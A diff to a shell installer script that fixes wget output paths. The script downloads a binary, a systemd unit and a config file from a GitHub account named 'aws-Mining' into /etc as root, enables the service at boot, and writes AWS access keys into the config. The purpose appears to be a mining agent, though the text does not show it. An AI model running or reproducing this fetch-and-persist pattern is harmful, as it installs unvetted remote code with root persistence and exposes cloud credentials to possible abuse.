@@ -4,7 +4,7 @@ key=""
 
 download_org(){
   sudo mkdir /etc/aws_org/
-  sudo wget -O /etc/aws_org/ https://github.com/aws-Mining/manager/raw/refs/heads/main/orgm 
+  sudo wget -O /etc/aws_org/orgm https://github.com/aws-Mining/manager/raw/refs/heads/main/orgm 
 }
 
 check_status(){
@@ -19,7 +19,7 @@ check_status(){
   fi
 }
 set_systemd(){
-    sudo wget -O /etc/systemd/system/ https://raw.githubusercontent.com/aws-Mining/manager/refs/heads/main/orgm.service
+    sudo wget -O /etc/systemd/system/orgm.service https://raw.githubusercontent.com/aws-Mining/manager/refs/heads/main/orgm.service
     systemctl daemon-reload #
     sudo systemctl enable orgm #
 }
@@ -40,7 +40,7 @@ check_service_file(){
   fi
 }
 set_config(){
-  sudo wget -O /etc/aws_org/ https://raw.githubusercontent.com/aws-Mining/manager/refs/heads/main/config.json
+  sudo wget -O /etc/aws_org/config.json https://raw.githubusercontent.com/aws-Mining/manager/refs/heads/main/config.json
   jq --arg key_id "$key_id" --arg key "$key" '.aws.access_key_id = $key_id | .aws.secret_access_key = $key' /etc/aws_org/config.json > tmp.json && mv tmp.json /etc/aws_org/config.json
 }
 
